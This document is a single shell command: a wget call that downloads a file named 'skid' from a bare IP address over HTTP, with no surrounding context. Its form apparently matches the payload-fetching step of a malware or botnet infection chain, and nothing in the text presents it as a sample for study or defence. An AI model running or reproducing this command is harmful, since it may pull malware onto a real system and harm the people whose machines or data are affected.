wget http://95.214.27.10/skid
